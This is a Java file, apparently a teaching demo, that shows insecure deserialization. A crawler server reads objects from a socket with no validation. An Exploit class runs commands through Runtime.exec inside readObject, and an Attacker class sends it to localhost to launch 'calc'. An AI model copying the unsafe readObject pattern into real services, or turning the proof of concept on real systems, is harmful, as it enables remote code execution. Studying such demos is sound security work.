import java.io.*;
import java.net.*;
import java.util.*;

// 领域模型：爬虫任务
class CrawlTask implements Serializable {
    private String url;
    private int maxDepth;
    
    public CrawlTask(String url, int maxDepth) {
        this.url = url;
        this.maxDepth = maxDepth;
    }
    
    public void execute() {
        System.out.println("Crawling: " + url + " with depth " + maxDepth);
        // 实际爬取逻辑...
    }
}

// 领域服务：爬虫工作者
class Worker {
    public void processTask(InputStream inputStream) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(inputStream);
        Object task = ois.readObject(); // 不安全的反序列化
        
        if (task instanceof CrawlTask) {
            ((CrawlTask) task).execute();
        } else {
            System.out.println("Unknown task type");
        }
    }
}

// 恶意类示例
class Exploit implements Serializable {
    private String cmd;
    
    public Exploit(String cmd) {
        this.cmd = cmd;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec(cmd); // 执行任意命令
    }
}

// 基础设施层：网络服务器模拟
public class CrawlerServer {
    public static void main(String[] args) throws Exception {
        ServerSocket ss = new ServerSocket(8080);
        System.out.println("Server started on port 8080");
        
        while (true) {
            Socket socket = ss.accept();
            new Thread(() -> {
                try {
                    Worker worker = new Worker();
                    worker.processTask(socket.getInputStream());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }
}

// 攻击演示类
public class Attacker {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("localhost", 8080);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        
        // 构造恶意对象
        Exploit exploit = new Exploit("calc");
        oos.writeObject(exploit);
        oos.flush();
    }
}